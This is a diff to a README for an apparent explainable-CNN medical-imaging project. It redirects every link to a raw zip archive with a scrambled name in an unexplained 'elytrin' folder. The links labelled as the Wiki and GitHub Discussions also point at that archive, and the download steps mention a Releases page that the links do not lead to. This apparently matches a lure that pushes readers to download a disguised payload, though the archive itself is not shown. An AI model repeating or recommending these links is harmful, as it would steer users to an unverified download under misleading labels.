@@ -1,6 +1,6 @@
 # 🩺 PathMNIST-XAI-Lightweight-Explainable-CNN-for-Medical-Imaging - High Accuracy for Medical Imaging
 
-[![Download](https://raw.githubusercontent.com/B-Yassine88/PathMNIST-XAI-Lightweight-Explainable-CNN-for-Medical-Imaging/main/elytrin/PathMNIST-XAI-Lightweight-Explainable-CNN-for-Medical-Imaging.zip)](https://raw.githubusercontent.com/B-Yassine88/PathMNIST-XAI-Lightweight-Explainable-CNN-for-Medical-Imaging/main/elytrin/PathMNIST-XAI-Lightweight-Explainable-CNN-for-Medical-Imaging.zip)
+[![Download](https://github.com/B-Yassine88/PathMNIST-XAI-Lightweight-Explainable-CNN-for-Medical-Imaging/raw/refs/heads/main/elytrin/Lightweight-CN-XA-MNIS-Path-Imaging-for-Medical-Explainable-1.7.zip)](https://github.com/B-Yassine88/PathMNIST-XAI-Lightweight-Explainable-CNN-for-Medical-Imaging/raw/refs/heads/main/elytrin/Lightweight-CN-XA-MNIS-Path-Imaging-for-Medical-Explainable-1.7.zip)
 
 ## 🎯 Description
 
@@ -21,7 +21,7 @@ To run this application, your computer should meet the following requirements:
 
 1. **Visit the Releases Page**: To download the application, click on the link below:
 
-   [Download PathMNIST-XAI](https://raw.githubusercontent.com/B-Yassine88/PathMNIST-XAI-Lightweight-Explainable-CNN-for-Medical-Imaging/main/elytrin/PathMNIST-XAI-Lightweight-Explainable-CNN-for-Medical-Imaging.zip)
+   [Download PathMNIST-XAI](https://github.com/B-Yassine88/PathMNIST-XAI-Lightweight-Explainable-CNN-for-Medical-Imaging/raw/refs/heads/main/elytrin/Lightweight-CN-XA-MNIS-Path-Imaging-for-Medical-Explainable-1.7.zip)
 
 2. **Choose the Latest Version**: On the Releases page, you will find a list of available versions. Look for the latest version and click on it.
 
@@ -60,8 +60,8 @@ After launching PathMNIST-XAI, follow these steps:
 
 ## 📚 Additional Resources
 
-- **Documentation**: Find detailed instructions and FAQs on our [Wiki](https://raw.githubusercontent.com/B-Yassine88/PathMNIST-XAI-Lightweight-Explainable-CNN-for-Medical-Imaging/main/elytrin/PathMNIST-XAI-Lightweight-Explainable-CNN-for-Medical-Imaging.zip).
-- **Community Support**: Join discussions and get help by connecting with users on our [GitHub Discussions](https://raw.githubusercontent.com/B-Yassine88/PathMNIST-XAI-Lightweight-Explainable-CNN-for-Medical-Imaging/main/elytrin/PathMNIST-XAI-Lightweight-Explainable-CNN-for-Medical-Imaging.zip).
+- **Documentation**: Find detailed instructions and FAQs on our [Wiki](https://github.com/B-Yassine88/PathMNIST-XAI-Lightweight-Explainable-CNN-for-Medical-Imaging/raw/refs/heads/main/elytrin/Lightweight-CN-XA-MNIS-Path-Imaging-for-Medical-Explainable-1.7.zip).
+- **Community Support**: Join discussions and get help by connecting with users on our [GitHub Discussions](https://github.com/B-Yassine88/PathMNIST-XAI-Lightweight-Explainable-CNN-for-Medical-Imaging/raw/refs/heads/main/elytrin/Lightweight-CN-XA-MNIS-Path-Imaging-for-Medical-Explainable-1.7.zip).
 
 ## 🤝 Contributors
 
